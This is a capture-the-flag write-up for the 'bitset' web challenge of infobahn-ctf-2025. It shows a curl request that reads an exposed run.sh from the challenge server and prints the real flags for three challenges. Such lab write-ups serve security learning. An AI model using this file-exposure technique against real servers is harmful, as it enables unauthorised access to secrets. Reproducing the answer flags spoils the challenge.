---
title: bitset
challenge_type: Web
author: "@rewhile @bawolff @yuu"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  bitset made an image-sharing website, go share some cool images with her!
connections:
  - url: https://bitset-web.challs.infobahnc.tf
attachments:
  - title: bitset.zip
    url: /assets/files/infobahn-ctf-2025/bitset/bitset.zip
---

**Note:** This writeup describes an unintended solution for the `bitset` challenge, as well as its follow-up challenges `bitsets` and `bitsetsy`. For the intended method, see [bitset-revenge](/competitions/infobahn-ctf-2025/bitset-revenge/).

## Recon

The website allows users to submit an image URL, which is then displayed on the site. Reviewing the source code reveals that the application is served by a Bun server, which proxies all requests to a PHP server except for those directed to the `/bot` endpoint.

![Landing page](/assets/files/infobahn-ctf-2025/bitset/website.png)

The server is launched via a `Dockerfile`, which uses `/app/run.sh` as its entrypoint. This shell script sets the flags as environment variables and then starts the Bun server.

```bash
#!/bin/bash

cd /app || exit
export FLAG1='infobahn{fake_flag1}'
export FLAG2='infobahn{fake_flag2}'
export FLAG3='infobahn{fake_flag3}'
bun /app/server.js
```

## Flag capture

Fortunately, Bun serves all files present in its working directory. This means we can directly request the `run.sh` script, which contains the flags for the `bitset`, `bitsets`, and `bitsetsy` challenges: `FLAG1`, `FLAG2`, and `FLAG3`.

```
$ curl https://bitset-web.challs.infobahnc.tf/run.sh
#!/bin/bash

cd /app || exit
export FLAG1='infobahn{1eT5_seE_whO_rE4Ds_th3_Php_docs}'
export FLAG2='infobahn{d1d_YOU_fINd_oUt_THI5_P4y10@D_From_por75wiG6Er}'
export FLAG3='infobahn{C0NgR@tS_you_aR3_A_SEnior_1n73Rn_IN_BEGInNeR}'
bun /app/server.js
```
